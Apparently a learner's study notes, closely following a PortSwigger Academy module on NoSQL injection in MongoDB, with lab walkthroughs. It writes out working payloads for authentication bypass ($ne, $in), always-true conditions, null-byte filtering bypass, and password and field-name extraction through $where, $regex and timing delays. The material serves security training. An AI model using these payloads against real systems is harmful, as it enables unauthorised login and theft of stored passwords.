---
description: >-
  https://portswigger.net/web-security/learning-paths/nosql-injection/types-of-nosql-injection/nosql-injection/types-of-nosql-injection
---

# 🙅 NoSQL injection

The following content is based 99% on the portswigger academy module, my goal is to take everything relevant in the course but practically all the content was very valuable to fully understand, so a better option would be to directly go on the academy module

**There are two different types of NoSQL injection:**

* Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in SQL injection. However the nature of the attack varies significantly, as NoSQL databases use a range of query languages, types of query syntax, and different data structures.
* Operator injection - This occurs when you can use NoSQL query operators to manipulate queries.

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

You can potentially detect NoSQL injection vulnerabilities by attempting to break the query syntax. To do this, systematically test each input by submitting fuzz strings and special characters that trigger a database error or some other detectable behavior if they're not adequately sanitized or filtered by the application.

#### Detecting syntax injection in MongoDB

let's say our url for the fuzzy page is:

```
https://insecure-website.com/product/lookup?category=fizzy
```

This causes the application to send a JSON query to retrieve relevant products from the `product` collection in the MongoDB database:

```
this.category == 'fizzy'
```

To test whether the input may be vulnerable, submit a fuzz string in the value of the `category` parameter

In mongoDB it looks like this:

```
'"`{
;$Foo}
$Foo \xYZ
```

* The goal is to evaluate if the application is vulnerable to NoSQL injection by testing the behavior when unusual or malicious input is provided to the "category" parameter.
* **Fuzzing**: Fuzzing involves providing unexpected, random, or malformed data to a system to uncover vulnerabilities.
* **Example String**:
  * `'"`{\`: This part seems to start with single and double quotes followed by an opening curly brace. This combination might be an attempt to break out of a string context or introduce a new object.
  * `;$Foo}`: This part injects a semicolon followed by a variable named "Foo" and a closing curly brace. The injection of variables or commands aims to manipulate the query's logic.
  * `$Foo \xYZ`: This section references the variable "Foo" followed by `\xYZ`, possibly trying to inject a command or exploit a vulnerability using the backslash as an escape character.
* **Execution**: By submitting this example string as the value for the "category" parameter, the tester can observe how the application responds. If the application behaves unexpectedly, such as executing additional commands or producing errors, it indicates potential vulnerability to NoSQL injection.

Use this fuzz string to construct the following attack:

```
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

#### Determining which characters are processed

To determine which characters are interpreted as syntax by the application, you can inject individual characters. For example, you could submit `'`, which results in the following MongoDB query:

`this.category == '''`

If this causes a change from the original response, this may indicate that the `'` character has broken the query syntax and caused a syntax error. You can confirm this by submitting a valid query string in the input, for example by escaping the quote:

`this.category == '\''`

If this doesn't cause a syntax error, this may mean that the application is vulnerable to an injection attack.

***

To test if we can influance boolean conditions, send two requests, one with a false condition and one with a true condition. For example you could use the conditional statements&#x20;

`' && 0 && 'x`&#x20;

and&#x20;

`' && 1 && 'x`&#x20;

as follows:

`https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x`

`https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x`

If the application behaves differently, this suggests that the false condition impacts the query logic, but the true condition doesn't. This indicates that injecting this style of syntax impacts a server-side query.

#### Overriding existing conditions

Now that you have identified that you can influence boolean conditions, you can attempt to override existing conditions to exploit the vulnerability. For example, you can inject a JavaScript condition that always evaluates to true, such as `'||1||'`:

`https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27`

This results in the following MongoDB query:

`this.category == 'fizzy'||'1'=='1'`

As the injected condition is always true, the modified query returns all items.

You can also add null character, MongoDB may ignore all characters after a null character.

imagine an item has an hidden query that enables us to see it:

```
this.category == 'fizzy' && this.released == 1
```

The restriction `this.released == 1` is used to only show products that are released. For unreleased products, presumably `this.released == 0`.

With a null charachter in our input, we can bypass the hidden&#x20;

```
https://insecure-website.com/product/lookup?category=fizzy'%00
```

### Lab: Detecting NoSQL injection

Given this website:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)   (4).png" alt=""><figcaption></figcaption></figure>

adding a null char after the category variables:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) ( (2).png" alt=""><figcaption></figcaption></figure>

To go further, we hop on cyberchef and URL encode the following payload:

```
Gifts' && 1 && 'x
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>a true condition in</p></figcaption></figure>

and it works:

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we are going to encode a boolean condition that always evaluates to true in the category parameter

```
Gifts'||1||'
```

output:

```
Gifts%27%7C%7C1%7C%7C%27
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### NoSQL operator injection

NoSQL databases often use query operators, which provide ways to specify conditions that data must meet to be included in the query result.

* `$where` - Matches documents that satisfy a JavaScript expression.
* `$ne` - Matches all values that are not equal to a specified value.
* `$in` - Matches all of the values specified in an array.
* `$regex` - Selects documents where values match a specified regular expression.

In JSON messages:

`{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`.

In URL-based inputs:

`username=wiener` becomes `username[$ne]=invalid`

If this doesn't work, you can try the following:

1. Convert the request method from `GET` to `POST`.
2. Change the `Content-Type` header to `application/json`.
3. Add JSON to the message body.
4. Inject query operators in the JSON.

#### Detecting operator injection in MongoDB

`{"username":{"$ne":"invalid"},"password":{"peter"}}`

If the `$ne` operator is applied, this queries all users where the username is not equal to `invalid`.

If both the username and password inputs process the operator, it may be possible to bypass authentication using the following payload:

`{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`

To target an account, you can construct a payload that includes a known username, or a username that you've guessed. For example:

```
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

### Lab: Exploiting NoSQL operator injection to bypass authentication

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So we had the credentials' wiener:peter so i was able to test out some fun stuff and realized that wien.\* was a valid regex and i could bypass the password with the $ne option. Let's try for admin:

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So i can just copy and paste this in burp browser or forward the request:

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and lab is solved

#### Exploiting syntax injection to extract data

some query operators or functions can run limited JavaScript code, such as MongoDB's `$where` operator and `mapReduce()` function

This means that, if a vulnerable application uses these operators or functions, the database may evaluate the JavaScript as part of the query.

#### Exfiltrating data in MongoDB

Consider this vulnerable URL:

`https://insecure-website.com/user/lookup?username=admin`

The NoSQL query of the `users` collection could look like this:

`{"$where":"this.username == 'admin'"}`

As the query uses the `$where` operator, you can attempt to inject JavaScript functions into this query so that it returns sensitive data. For example, you could send the following payload:

`admin' && this.password[0] == 'a' || 'a'=='b`

* `admin'`: This suggests that the string is attempting to authenticate as an admin user.
* `&&`: This is the logical AND operator used to combine conditions.
* `this.password[0] == 'a'`: This condition seems to check whether the first character of the password matches 'a'.
* `||`: This is the logical OR operator.
* `'a'=='b'`: This condition seems to compare whether 'a' is equal to 'b'

This returns the first character of the user's password string, enabling you to extract the password character by character.

You could also use the JavaScript `match()` function to extract information. For example, the following payload enables you to identify whether the password contains digits:

`admin' && this.password.match(/\d/) || 'a'=='b`

#### Identifying field names

to identify whether the MongoDB database contains a `password` field:

```
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
```

And you can check if a field exist by comparing the response with a field you know exist and with a probably non-existing field&#x20;

`admin' && this.username!='`&#x20;

`admin' && this.foo!='`

If the `password` field exists, you'd expect the response to be identical to the response for the existing field (`username`), but different to the response for the field that doesn't exist (`foo`).

### Lab: Exploiting NoSQL injection to extract data

<figure><img src="../../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>

We start by injecting a simple payload to see what columns exist

but the query does not seem to work after putting nonsense in my request:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)   (3).png" alt=""><figcaption></figcaption></figure>

But whatsoever, we are able to check out the administrator user

after doing a sniper attack on the payload to check out the first letter of the password, we get a response:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) ( (1).png" alt=""><figcaption></figcaption></figure>

Now we just need to cluster bomb the position of the letter and the letter and let it run

Unfortunately, i don't have burp pro anymore, so it's going to take forever

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

i'll get a timeout on my website before the payload is finished but it technically works

#### Injecting operators in MongoDB

Consider a vulnerable application that accepts username and password in the body of a `POST` request:

`{"username":"wiener","password":"peter"}`

To see if we can inject operators, we can add `$where` statement with a true and a false one to see if the javascript expression is being evaluated:

```
{"username":"wiener","password":"peter", "$where":"0"}

{"username":"wiener","password":"peter", "$where":"1"}
```

If it does run JS, we could use the `keys()` method to extract the name of data fields. For example, you could submit the following payload:

```
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

* `$where"`: This indicates that the following value will be a JavaScript expression that will be evaluated for each document in the collection.
* `":"`: This separates the field name (`"$where"`) from its corresponding value (the JavaScript expression).
* `Object.keys(this)`: This function returns an array of the names of the enumerable properties (keys) of an object. In this case, `this` refers to the current document being evaluated.
* `[0]`: This accesses the first element of the array returned by `Object.keys(this)`. This effectively gets the name of the first field in the document.
* `.match('^.{0}a.*')`: This is a regular expression pattern matching operation using the `.match()` method.
  * `^`: Matches the start of the string.
  * `.{0}`: Matches any character (`.`) zero times (`{0}`). Essentially, it allows any characters at the beginning of the string.
  * `a`: Matches the character 'a'.
  * `.*`: Matches any character (`.`) zero or more times (`*`). Essentially, it allows any characters after 'a'.

You are not even obliged to be running JavaScript to  be able to retrieve data, you could use the `$regex` operator

You could start by testing whether the `$regex` operator is processed as follows:

```
{"username":"admin","password":{"$regex":"^.*"}}
```

If the response to this request is different to the one you receive when you submit an incorrect password, this indicates that the application may be vulnerable. You can use the `$regex` operator to extract data character by character. For example, the following payload checks whether the password begins with an `a`:

```
{"username":"admin","password":{"$regex":"^a*"}}
```

### Lab: Exploiting NoSQL operator injection to extract unknown fields

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Where we would get "password incorrect" we now get "account blocked when we try to bypass auth, so our operator is accepted and the input vulnerable&#x20;

now let's try to inject straight up JS:

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So the JS seems to by injected&#x20;

So now we are going to use the Keys() function to extract the name of the datafield:

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I am not able to perform cluster bombs so i'll have to pass on this one by this are thesteps for completion:

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Timing based injection

1. Load the page several times to determine a baseline loading time.
2. Insert a timing based payload into the input. A timing based payload causes an intentional delay in the response when executed. For example, `{"$where": "sleep(5000)"}` causes an intentional delay of 5000 ms on successful injection.
3. Identify whether the response loads more slowly. This indicates a successful injection.

The following timing based payloads will trigger a time delay if the password beings with the letter `a`:

```
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```

```
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```
